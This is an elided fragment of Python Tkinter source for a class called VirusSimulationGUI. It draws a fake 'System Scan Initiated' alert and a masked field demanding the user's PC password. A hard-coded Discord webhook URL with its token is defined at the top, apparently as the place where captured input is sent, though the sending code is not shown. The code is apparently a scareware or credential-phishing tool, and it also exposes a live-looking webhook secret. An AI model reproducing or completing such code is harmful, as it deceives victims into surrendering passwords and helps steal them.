...
WEBHOOK_URL = "https://discord.com/api/webhooks/1403605588151238737/kFz1Z4V5eW_ZOE4Fn6Bbgh1O9T80I6WGQduqJBkdJApVN598WVxfF7EEBkSw3OKab57l"
...
class VirusSimulationGUI:
    def __init__(self, root):
        ...
        self.title_label = tk.Label(root, text="System Scan Initiated", font=("Consolas", 14, "bold"), fg="#ff5555", bg="#121212")
        ...
        self.status_text = tk.Text(root, height=12, width=65, font=("Consolas", 9), fg="#55ff55", bg="#000000", wrap=tk.WORD, relief=tk.FLAT)
        ...
        tk.Label(self.password_frame, text="Password:", font=("Consolas", 9), fg="#dddddd", bg="#121212").pack(side=tk.LEFT)
        self.password_entry = tk.Entry(self.password_frame, show="*", width=12, font=("Consolas", 9), bg="#222222", fg="#ffffff", insertbackground="#ffffff", relief=tk.FLAT)
        self.password_entry.pack(side=tk.LEFT, padx=5)
        self.password_entry.bind("<Return>", self.check_password)

        self.password_hint = tk.Label(root, text="ENTER PC PASSWORD", font=("Consolas", 9, "bold"), fg="#ff4444", bg="#121212")
